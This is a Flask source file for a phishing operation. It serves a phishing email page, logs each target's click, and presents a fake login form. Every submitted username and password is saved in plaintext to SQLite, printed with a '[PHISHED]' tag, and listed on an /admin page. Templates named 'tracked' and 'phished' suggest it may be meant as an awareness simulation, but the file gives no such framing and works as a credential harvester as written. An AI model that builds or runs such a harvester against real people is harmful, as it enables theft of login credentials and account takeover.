from flask import Flask, render_template, request
from datetime import datetime
import sqlite3
from flask import request

app = Flask(__name__)

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/phishing-email')
def phishing_email():
    return render_template('email.html')

@app.route('/track-click')
def track_click():
    target = request.args.get('target', 'unknown')
    timestamp = datetime.now().isoformat()

    # Save to database
    conn = sqlite3.connect('database.db')
    c = conn.cursor()
    c.execute("INSERT INTO clicks (target, timestamp) VALUES (?, ?)", (target, timestamp))
    conn.commit()
    conn.close()

    print(f"[TRACKED] Click: target={target}, time={timestamp}")
    return render_template('tracked.html', target=target)

@app.route('/dashboard')
def dashboard():
    conn = sqlite3.connect('database.db')
    c = conn.cursor()
    c.execute("SELECT target, timestamp FROM clicks ORDER BY timestamp DESC")
    clicks = c.fetchall()
    conn.close()

    return render_template('dashboard.html', clicks=clicks)

@app.route('/login')
def login_page():
    return render_template('login.html')

@app.route('/submit-login', methods=['POST'])
def submit_login():
    username = request.form.get('username')
    password = request.form.get('password')
    timestamp = datetime.now().isoformat()

    # Save to database
    conn = sqlite3.connect('database.db')
    c = conn.cursor()
    c.execute("INSERT INTO credentials (username, password, timestamp) VALUES (?, ?, ?)",
              (username, password, timestamp))
    conn.commit()
    conn.close()

    print(f"[PHISHED] username={username} | password={password} | time={timestamp}")
    return render_template('phished.html', username=username)

@app.route('/admin')
def admin_dashboard():
    conn = sqlite3.connect('database.db')
    c = conn.cursor()
    c.execute("SELECT username, password, timestamp FROM credentials ORDER BY timestamp DESC")
    credentials = c.fetchall()
    conn.close()
    return render_template('admin.html', credentials=credentials)

if __name__ == '__main__':
    app.run(debug=True)
